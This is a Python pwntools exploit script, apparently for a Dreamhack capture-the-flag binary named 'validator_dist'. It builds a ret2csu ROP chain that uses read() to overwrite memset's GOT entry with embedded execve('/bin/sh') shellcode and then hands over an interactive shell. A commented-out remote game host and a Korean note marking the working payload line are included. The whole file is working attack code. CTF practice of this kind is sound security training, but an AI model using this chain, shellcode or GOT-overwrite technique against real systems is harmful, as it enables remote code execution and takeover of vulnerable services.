from pwn import *
 
context.log_level = 'debug'

csu_pop = 0x00000000004006EA
#pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 ret
csu_mov = 0x00000000004006D0
#r15 -> rdx r14 -> rsi r13 -> rdi  call r12+rbx*8


shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
#31byte
payload = b"DREAMHACK!"
arr = []
for i in range(118,0,-1):
   arr.append(i)

payload += bytearray(arr)
payload += p64(0)

print(len(payload))

# p = remote('host1.dreamhack.games', 8752)
p = process('./validator_dist')
e = ELF('./validator_dist')

gdb.attach(p)

bss = e.bss()

def make_csu_chain(address, arg1, arg2, arg3):
    temp = p64(csu_pop) + p64(0) + p64(1) + address + arg1 + arg2 + arg3 + p64(csu_mov)
    return temp

payload += make_csu_chain(p64(e.got['read']), p64(0), p64(e.got['memset']), p64(len(shellcode)+1))
# payload += p64(e.got['memset'])

#위 코드 대신 이 코드를 사용하면 exploit이 됨 
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(e.got['memset']) 

p.sendline(payload)
# sleep(0.5)
# p.sendline(shellcode)
p.interactive()